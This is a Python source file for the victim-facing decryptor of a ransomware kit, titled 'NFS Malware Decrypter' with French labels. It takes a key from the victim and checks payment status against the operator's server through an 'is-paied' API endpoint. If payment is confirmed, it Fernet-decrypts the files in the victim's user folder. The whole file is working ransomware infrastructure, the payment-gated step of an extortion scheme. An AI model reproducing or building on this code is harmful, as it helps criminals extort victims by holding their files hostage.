import os
import time
import tkinter
from tkinter.ttk import Progressbar
import customtkinter
import requests
from env import BASE_API_URL
from device_infos import get_user_path
from cryptography.fernet import Fernet


customtkinter.set_appearance_mode("Dark")
customtkinter.set_default_color_theme("blue")  

app = customtkinter.CTk()
app.title("NFS Malware Decrypter")
app.geometry("430x250")


def decrypt_function():
    input_value= input.get()
    input.place_forget()
    button.place_forget()
    app.update()
    progressbar = Progressbar(app, orient=tkinter.HORIZONTAL, length=300, mode="determinate", maximum=100)
    progressbar.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)

    response = requests.get(BASE_API_URL + '/api/is-paied/' + input_value)

    if response.status_code == 200:
        res = response.json()

        if res['is_paied'] is True:
      
            i = 0
            path = get_user_path()
            for root, dirs, files in os.walk(path):
                for entry in files:
                    if not entry.endswith(('.ini')):
                        with open(os.path.join(root, entry), "rb") as _file:
                            encrypted = _file.read()
                        decrypted = Fernet(input_value).decrypt(encrypted)
                        with open(os.path.join(root, entry), "wb") as decrypted_file:
                            decrypted_file.write(decrypted)
                    progressbar['value'] += (100 / res['infected_files'])
                    app.update_idletasks()
                    time.sleep(0.2)
                    i += 1
            
            decrypt_response = str(i - 1) + " fichiers décryptés dans le dossier : " + path
            text = tkinter.Label(app, bg="black", fg="white", text=decrypt_response)
            text.place(relx=0.5, rely=0.65, anchor=tkinter.CENTER)


input = customtkinter.CTkEntry(app, placeholder_text="DECRYPT_KEY", width=280, height=35)
input.place(relx=0.5, rely=0.3, anchor=tkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Décrypter", height=40, command=decrypt_function)
button.place(relx=0.5, rely=0.55, anchor=tkinter.CENTER)

app.mainloop()
